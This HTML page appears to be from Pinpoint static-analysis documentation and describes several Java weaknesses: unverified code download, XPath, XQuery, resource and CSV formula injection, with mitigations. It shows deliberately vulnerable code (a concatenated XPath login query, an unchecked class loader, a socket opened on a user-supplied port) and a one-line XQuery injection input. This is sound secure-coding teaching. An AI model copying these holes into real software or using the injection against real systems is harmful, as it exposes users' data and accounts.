<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Use tools or frameworks to perform integrity checking on the transmitted code. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>This example loads an external class from a local subdirectory.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">URL</span><span class="o">[]</span> <span class="n">classURLs</span><span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">[]{</span>
<span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">"file:subdir/"</span><span class="o">)</span>
<span class="o">};</span>
<span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLClassLoader</span><span class="o">(</span><span class="n">classURLs</span><span class="o">);</span>
<span class="n">Class</span> <span class="n">loadedClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">loader</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code.</p>
<h3 id="fixed-code-example">Fixed code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">URL</span><span class="o">[]</span> <span class="n">classURLs</span><span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">[]{</span>
<span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">"file:subdir/"</span><span class="o">)</span>
<span class="o">};</span>
<span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLClassLoader</span><span class="o">(</span><span class="n">classURLs</span><span class="o">);</span>
<span class="n">loader</span><span class="o">.</span><span class="na">findResource</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">);</span>  <span class="c1">// Check Class</span>
<span class="n">Class</span> <span class="n">loadedClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">loader</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/494.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-494.html">CWE-494</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1096">XPath Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Extensible Markup Language (XML) can be used for data storage in a manner similar to a relational database. Data is frequently retrieved from such an XML document using XPaths. XPath injection can occur when data supplied to an XPath retrieval routine to retrieve data from an XML document is used without proper sanitization.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>This attack is similar to SQL injection or XML injection. An attacker can enter valid SQL or XML constructs in the data fields of the query in use. In typical attacks, the conditional field of the query resolves to a tautology or otherwise gives the attacker access to privileged information.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Treat all user input as untrusted, and perform appropriate sanitization.</p>
</li>
<li>
<p>When sanitizing user input, verify the correctness of the data type, length, format, and content.</p>
</li>
<li>
<p>In a client-server application, perform validation at both the client and the server sides.</p>
</li>
<li>
<p>Extensively test applications that supply, propagate, or accept user input.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example reads a user name and password from the user and uses them to construct the query string:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">doLogin</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span><span class="o">)</span>
  <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">XPathExpressionException</span> <span class="o">{</span>

  <span class="n">DocumentBuilderFactory</span> <span class="n">domFactory</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
  <span class="n">domFactory</span><span class="o">.</span><span class="na">setNamespaceAware</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
  <span class="n">DocumentBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">domFactory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
  <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"users.xml"</span><span class="o">);</span>
  <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span> <span class="n">password</span><span class="o">);</span>

  <span class="n">XPathFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">XPathFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
  <span class="n">XPath</span> <span class="n">xpath</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newXPath</span><span class="o">();</span>
  <span class="n">XPathExpression</span> <span class="n">expr</span> <span class="o">=</span> <span class="n">xpath</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"//users/user[username/text()='"</span> <span class="o">+</span>
       <span class="n">userName</span> <span class="o">+</span> <span class="s">"' and password/text()='"</span> <span class="o">+</span> <span class="n">pwd</span> <span class="o">+</span> <span class="s">"' ]"</span><span class="o">);</span>
  <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="n">expr</span><span class="o">.</span><span class="na">evaluate</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="n">XPathConstants</span><span class="o">.</span><span class="na">NODESET</span><span class="o">);</span>
  <span class="n">NodeList</span> <span class="n">nodes</span> <span class="o">=</span> <span class="o">(</span><span class="n">NodeList</span><span class="o">)</span> <span class="n">result</span><span class="o">;</span>

  <span class="c1">// Print first names to the console</span>
  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
    <span class="n">Node</span> <span class="n">node</span> <span class="o">=</span> <span class="n">nodes</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">1</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span> <span class="s">"Authenticated: "</span> <span class="o">+</span> <span class="n">node</span><span class="o">.</span><span class="na">getNodeValue</span><span class="o">());</span>
  <span class="o">}</span>

  <span class="k">return</span> <span class="o">(</span><span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses a query specified in a text file by reading the file in the required format and then inserting values for the user name and password in a Map. The XQuery library constructs the XML query from these inputs:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">doLogin</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">,</span> <span class="n">String</span> <span class="n">pwd</span><span class="o">)</span>
  <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">XPathExpressionException</span> <span class="o">{</span>

  <span class="n">DocumentBuilderFactory</span> <span class="n">domFactory</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
  <span class="n">domFactory</span><span class="o">.</span><span class="na">setNamespaceAware</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
  <span class="n">DocumentBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">domFactory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
  <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"users.xml"</span><span class="o">);</span>

  <span class="n">XQuery</span> <span class="n">xquery</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XQueryFactory</span><span class="o">().</span><span class="na">createXQuery</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"login.xq"</span><span class="o">));</span>
  <span class="n">Map</span> <span class="n">queryVars</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
  <span class="n">queryVars</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"userName"</span><span class="o">,</span> <span class="n">userName</span><span class="o">);</span>
  <span class="n">queryVars</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
  <span class="n">NodeList</span> <span class="n">nodes</span> <span class="o">=</span> <span class="n">xquery</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">queryVars</span><span class="o">).</span><span class="na">toNodes</span><span class="o">();</span>

  <span class="c1">// Print first names to the console</span>
  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
    <span class="n">Node</span> <span class="n">node</span> <span class="o">=</span> <span class="n">nodes</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">1</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">node</span><span class="o">.</span><span class="na">getNodeValue</span><span class="o">());</span>
  <span class="o">}</span>

  <span class="k">return</span> <span class="o">(</span><span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS53-J.+Prevent+XPath+Injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1095">XQuery Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Use parameterized queries.</p>
</li>
<li>
<p>Properly validate user input.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>doc(accounts.xml)//user[Name='*']
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<p>[^capec]： https://capec.mitre.org/data/definitions/84.html</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1076">Resource Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Unintended modification or specification of a resource.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Ensure all input content that is delivered to client is sanitized against an acceptable content specification.</p>
</li>
<li>
<p>Perform input validation for all content.</p>
</li>
<li>
<p>Enforce regular patching of software.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following examples represent an application which gets a port number from an HTTP request and creates a socket with this port number without any validation. A user using a proxy can modify this port and obtain a direct connection (socket) with the server. </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">rPort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"remotePort"</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">ServerSocket</span> <span class="n">srvr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServerSocket</span><span class="o">(</span><span class="n">rPort</span><span class="o">);</span>
<span class="n">Socket</span> <span class="n">skt</span> <span class="o">=</span> <span class="n">srvr</span><span class="o">.</span><span class="na">accept</span><span class="o">();</span> 
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Resource_Injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-capec">
<p>https://capec.mitre.org/data/definitions/240.html <a class="footnote-backref" href="#fnref-capec" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1085">Formula Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Formula Injection, also known as CSV Injection, occurs when websites embed untrusted input inside CSV files.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with '=' will be interpreted by the software as a formula. Maliciously crafted formulas can be used for three key attacks:</p>
<ul>
<li>
<p>Hijacking the user's computer by exploiting vulnerabilities in the spreadsheet software, such as CVE-2014-3524</p>
</li>
<li>
<p>Hijacking the user's computer by exploiting the user's tendency to ignore security warnings in spreadsheets that they downloaded from their own website</p>
</li>
<li>
<p>Exfiltrating contents from the spreadsheet, or other open spreadsheets.</p>
</li>
</ul>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>This attack is difficult to mitigate, and explicitly disallowed from quite a few bug bounty programs. To remediate it, ensure that no cells begin with any of the following characters:</p>
<ul>
<li>Equals to ("=")</li>
<li>Plus ("+")</li>
<li>Minus ("-")</li>
<li>At ("@")</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/CSV_Injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

    <footer>
 <p>
  &copy; Pinpoint 2016-Present, Rights reserve
</p>

<p>
</p>     </footer>
</main>

  <script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Pinpoint Document ",
  "url" : "../../..",
  "image": "",
  "description": "Manual and documents for Sourcebrella Pinpoint"
}
</script> 
<div id="initDiv"
     style="position: fixed; z-index: 1000; background-color: white; top: 0; right: 0; bottom: 0; left: 0; "></div>
<script type="text/javascript">
    window.onload = function () {
        document.getElementsByTagName('body')[0].style.display = "block";
        document.getElementById('initDiv').style.display = 'none';

        document.querySelectorAll('.global_lang li a').forEach(elm => {
            elm.addEventListener('click', (e) => {
                var lang = e.target.getAttribute('language-link');
                var abs_url = '/' + lang + '/';
                var reg = /\/(en|zh)\//;
                var newRef;
                var location = window.location;
                if (reg.test(location.href)) {
                    newRef = location.href.replace(reg, abs_url);
                } else {
                    var match = /\/(output|docs)\//.exec(window.location.href);
                    if (match) {
                        newRef = window.location.href.replace(match[0], '/' + match[1] + abs_url)
                    } else {
                        return;
                    }
                }
                window.open(newRef, '_self')
            })
        })
    };

</script>
</body>

</html>